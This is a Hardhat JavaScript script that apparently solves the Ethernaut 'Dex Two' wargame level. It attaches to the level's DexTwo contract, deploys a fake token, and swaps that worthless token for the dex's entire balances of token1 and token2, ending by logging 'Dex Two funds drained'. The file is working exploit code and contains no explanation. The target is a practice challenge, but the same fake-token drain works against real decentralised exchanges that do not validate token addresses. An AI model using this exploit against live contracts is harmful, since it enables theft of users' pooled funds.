const { ethers } = require('hardhat');
const hre = require('hardhat');

async function main() {
  // Ethernaut level
  const dexTwoContract = '0x3Da11c05356ff22e5457e53aB95E65F1Be709516';
  const [deployer] = await ethers.getSigners();

  console.log('Deploying contracts with the account:', deployer.address);
  console.log('Account balance:', (await deployer.getBalance()).toString());

  const DexTwo = await ethers.getContractFactory('DexTwo', deployer);
  const DexTwoSolution = await ethers.getContractFactory('DexTwoSolution', deployer);

  const dexTwo = await DexTwo.attach(dexTwoContract);
  const dexTwoSolution = await DexTwoSolution.deploy(dexTwo.address, 'fake', 'fake', 1000000);
  const tokenAdd1 = await dexTwo.token1();
  const tokenAdd2 = await dexTwo.token2();

  await dexTwoSolution.approve2(deployer.address, dexTwo.address, 1000000);
  await dexTwoSolution.transfer(dexTwo.address, 1);
  await dexTwo.connect(deployer).approve(dexTwo.address, await dexTwoSolution.balanceOf(deployer.address));

  const token1onDex = await dexTwo.balanceOf(tokenAdd1, dexTwo.address);
  const priceForAllToken1 = await dexTwo.getSwapAmount(tokenAdd1, dexTwoSolution.address, token1onDex);
  const swap1Tx = await dexTwo.connect(deployer).swap(dexTwoSolution.address, tokenAdd1, priceForAllToken1);
  await swap1Tx.wait();

  const token2onDex = await dexTwo.balanceOf(tokenAdd2, dexTwo.address);
  const priceForAllToken2 = await dexTwo.getSwapAmount(tokenAdd2, dexTwoSolution.address, token2onDex);
  const swap2Tx = await dexTwo.connect(deployer).swap(dexTwoSolution.address, tokenAdd2, priceForAllToken2);
  await swap2Tx.wait();

  console.log('Dex Two funds drained');
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
